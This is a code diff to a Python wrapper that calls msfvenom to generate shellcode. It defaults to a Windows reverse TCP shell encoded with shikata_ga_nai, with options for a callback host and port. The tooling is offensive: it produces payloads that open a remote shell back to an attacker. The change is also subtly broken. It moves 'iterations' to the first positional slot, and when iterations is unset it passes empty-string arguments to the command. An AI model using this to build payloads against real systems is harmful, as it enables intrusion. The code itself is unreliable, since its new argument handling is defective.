@@ -36,11 +36,11 @@ def _cache_path(key: str) -> Path:
 
 
 def generatePayload(
+    iterations: Optional[int] = None,
     payload: str = "windows/shell_reverse_tcp",
     LHOST: Optional[str] = None,
     LPORT: Optional[int] = None,
     encoder: str = "x86/shikata_ga_nai",
-    iterations: int = 1,
     bad_chars: str = "",
     arch: Literal["x86", "x64"] = "x86",
     platform: str = "windows",
@@ -75,7 +75,7 @@ def generatePayload(
     cmd = [MSFVENOM_PATH, "-p", payload, "-f", "raw"]
     cmd += ["-a", arch, "--platform", platform]
     if encoder:
-        cmd += ["-e", encoder, "-i", str(iterations)]
+        cmd += ["-e", encoder, "-i" if iterations else "", str(iterations) if iterations else ""]
     if bad_chars_hex:
         cmd += ["-b", bad_chars_hex]
     if LHOST:
